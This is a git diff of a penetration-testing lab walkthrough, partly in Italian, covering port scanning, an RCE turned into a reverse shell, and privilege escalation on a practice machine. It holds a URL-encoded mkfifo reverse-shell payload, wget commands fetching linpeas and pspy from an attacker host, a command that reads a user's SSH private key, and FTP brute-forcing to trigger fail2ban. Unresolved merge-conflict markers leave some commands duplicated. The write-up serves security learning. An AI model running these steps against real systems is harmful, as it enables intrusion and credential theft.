@@ -1,6 +1,10 @@
 ### **PORT SCANNING**
 ```bash
+<<<<<<< HEAD
 nmap -sT -T5 -p- 192.168.5.129
+=======
+nmap -Pn -sVC 192.168.86.129 -vvv
+>>>>>>> cd2ed5db91b93c0ea740f887a442d6540d40e7b6
 ```
 ![[Pasted image 20231011153211.png]]
 
@@ -63,8 +67,23 @@ rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%20
 Now use the rce to obtain a reverse shell
 ![[Pasted image 20231012163853.png]]
 *www-Data to John*
-intera home j.brock leggibile da gruppo web-developer di cui www-Data fa parte
-![[Pasted image 20231012164214.png]]
+Scarica linpeas ed avvialo
+```bash
+python3 -m http.server 8080
+```
+```bash
+wget http://192.168.86.130:8080/linpeas.sh
+```
+avvialo
+```bash
+chmod +x ./linpeas.sh
+```
+```bash
+./linpeas > out.txt
+```
+```bash
+less -r out.txt
+```
 catta id_rsa
 ``` bash
 cat /home/j.brock/.ssh/id_rsa
@@ -122,6 +141,7 @@ Entra su ssh come j.brock
 ==ricorda chmod 400 su id_rsa==
 ### **j.brock to m.hack**
 Scarica linpeas ed avvialo
+
 ```bash
 wget http://192.168.5.128/linpeas.sh
 ```
@@ -206,7 +226,11 @@ vim log_alert.conf
 ```
 ![[Pasted image 20231012171555.png]]
 ```bash
+<<<<<<< HEAD
 wget http://192.168.5.128/pspy64
+=======
+wget http://192.168.86.130:8080/pspy64.sh
+>>>>>>> cd2ed5db91b93c0ea740f887a442d6540d40e7b6
 ```
 Aspetta il restart tramite cronjob (ogni minuto)
 tenta di bruteforzare ftp per triggerare fail2ban
